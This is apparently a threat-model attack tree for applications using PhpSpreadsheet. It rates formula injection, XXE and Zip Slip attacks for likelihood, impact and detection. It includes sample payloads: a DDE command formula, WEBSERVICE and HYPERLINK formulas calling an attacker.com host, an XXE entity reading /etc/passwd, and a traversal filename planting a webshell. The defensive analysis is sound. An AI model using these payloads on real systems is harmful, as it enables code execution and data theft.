## Attack Tree Path: [1.2 XLS/XLSX Formula Injection](./attack_tree_paths/1_2_xlsxlsx_formula_injection.md)

*   **Description:** Attackers inject malicious formulas into cells of XLS or XLSX files. These formulas are executed by the spreadsheet software (e.g., Microsoft Excel) when the file is opened.  This is a direct attack on the processing logic of the spreadsheet software, leveraging PhpSpreadsheet to create the malicious file.
*   **1.2.1 Inject malicious formulas (e.g., DDE, WEBSERVICE, HYPERLINK):**
    *   **Description:** The attacker crafts input that, when processed by PhpSpreadsheet and written to a spreadsheet file, results in a cell containing a malicious formula.  Examples include:
        *   `=DDE("cmd";"/C calc";"a")`:  (Dynamic Data Exchange) Attempts to execute a command (here, `calc.exe`).  DDE is often disabled in modern Excel configurations, but older versions or misconfigured systems are vulnerable.
        *   `=WEBSERVICE("http://attacker.com/malicious.php")`:  Fetches data from a malicious URL.  The fetched data could contain further exploits or be used to exfiltrate information.
        *   `=HYPERLINK("http://attacker.com/payload.exe","Click Me")`:  Tricks the user into clicking a link that downloads and executes a malicious file.  This relies on social engineering.
    *   **Likelihood:** High. If user input is used to populate cell values without proper sanitization, this is very easy to exploit.
    *   **Impact:** High. Successful exploitation can lead to arbitrary code execution on the user's machine (if they open the file) or on the server (if the server-side application processes the formula result).
    *   **Effort:** Low.  Crafting the malicious formula is trivial.
    *   **Skill Level:** Medium. Requires understanding of spreadsheet formula syntax and potential injection points.
    *   **Detection Difficulty:** Medium.  Requires monitoring for unusual formulas and potentially analyzing the behavior of opened spreadsheets.

## Attack Tree Path: [2.1 XXE in XLSX/XML](./attack_tree_paths/2_1_xxe_in_xlsxxml.md)

*   **Description:** XLSX files are ZIP archives containing XML files.  XML External Entity (XXE) attacks exploit vulnerabilities in XML parsers.  If PhpSpreadsheet's XML parser is not configured securely, an attacker can craft a malicious XLSX file that includes external entity references. These references can point to local files on the server or internal network resources.
*   **2.1.1 Craft XLSX with malicious external entity references:**
    *   **Description:** The attacker creates a specially crafted XLSX file.  Within one of the XML files inside the XLSX (e.g., `xl/workbook.xml`), they include an XML entity definition that points to an external resource.  For example:
        ```xml
        <!DOCTYPE foo [
          <!ELEMENT foo ANY >
          <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>
        ```
        When PhpSpreadsheet parses this XML, it may attempt to resolve the `&xxe;` entity, which would read the contents of `/etc/passwd` (or any other file the web server has access to).
    *   **Likelihood:** High. If external entity resolution is not explicitly disabled, this is a likely vulnerability.
    *   **Impact:** High.  Allows attackers to read arbitrary files on the server, potentially including configuration files, source code, or sensitive data.  Can also be used for Server-Side Request Forgery (SSRF) to access internal network resources.
    *   **Effort:** Medium. Requires understanding of XML and XXE vulnerabilities.
    *   **Skill Level:** High. Requires knowledge of XML, XXE, and the target system's file structure.
    *   **Detection Difficulty:** High.  Requires monitoring for unusual XML entity declarations and potentially analyzing network traffic for unexpected requests.

## Attack Tree Path: [2.2 Zip Slip/Path Traversal](./attack_tree_paths/2_2_zip_slippath_traversal.md)

*   **Description:** XLSX files are ZIP archives.  A "Zip Slip" vulnerability occurs when a ZIP archive contains files with filenames that include path traversal sequences (e.g., `../`).  If PhpSpreadsheet doesn't properly validate filenames during extraction, it could be tricked into writing files outside of the intended directory.
*   **2.2.1 Craft malicious file with crafted filenames (e.g., ../../../etc/passwd):**
    *   **Description:** The attacker creates a malicious XLSX file.  Within the ZIP archive, they include a file with a name like `../../../../var/www/html/shell.php`.  If PhpSpreadsheet extracts this file without proper validation, it might overwrite an existing file or create a new file (e.g., a PHP webshell) in a location accessible by the web server.
    *   **Likelihood:** High. If filename validation is not robust, this is a likely vulnerability.
    *   **Impact:** High.  Allows attackers to overwrite arbitrary files on the server, potentially leading to code execution (e.g., by overwriting a PHP file).
    *   **Effort:** Medium. Requires understanding of ZIP file structure and path traversal vulnerabilities.
    *   **Skill Level:** High. Requires knowledge of ZIP archives, path traversal, and the target system's file structure.
    *   **Detection Difficulty:** High. Requires monitoring file system changes for unexpected writes and potentially analyzing uploaded files for malicious filenames.
